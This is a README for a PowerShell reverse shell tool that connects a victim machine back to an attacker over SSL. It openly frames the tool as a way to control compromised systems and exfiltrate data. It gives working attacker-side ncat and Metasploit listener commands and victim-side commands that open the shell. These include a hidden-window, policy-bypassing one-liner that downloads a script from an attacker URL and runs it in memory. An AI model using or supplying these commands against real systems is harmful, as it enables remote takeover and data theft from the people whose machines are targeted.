# PowerShell-SSL-ReverseShell
PowerShell SSL Reverse Shell is a reverse shell program written in PowerShell, which establishes a connection between the attacker's machine and the victim's machine using SSL communications. This tool can be used to remotely access a compromised system, allowing the attacker to execute commands and exfiltrate data from the victim's machine.

The code used to build "PowerShell SSL ReverseShell" is based on "Invoke-PowerShellTcp.ps1" from "samratashok/nishang," a popular collection of PowerShell scripts used for penetration testing and offensive security purposes and [PowerShell-reverse-shell](https://github.com/martinsohn/PowerShell-reverse-shell). The reverse shell program leverages the secure SSL protocol to establish a connection between the attacker and victim, ensuring that the communication between the two machines is encrypted and protected from interception by third parties.

## Usage

### Attacker Machine

- #### Ncat
```bash 

❯ rlwrap ncat --ssl -lnvp 4646

```

- #### Metasploit
```bash 

❯ msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set lhost 192.168.254.226; set lport 4646; set ExitOnSession false; exploit -j"

```


### Victim Machine
```powershell 

PS > Import-Module .\GetShellSSL

PS > GetShell -Reverse -IPAddress 192.168.254.226 -Port 4646

```

OR

```powershell

PS > powershell.exe -windowstyle hidden -ExecutionPolicy Unrestricted -nop -Command "IEX (New-Object Net.WebClient).DownloadString('https://<IP>/GetShellSSL.ps1')"

```
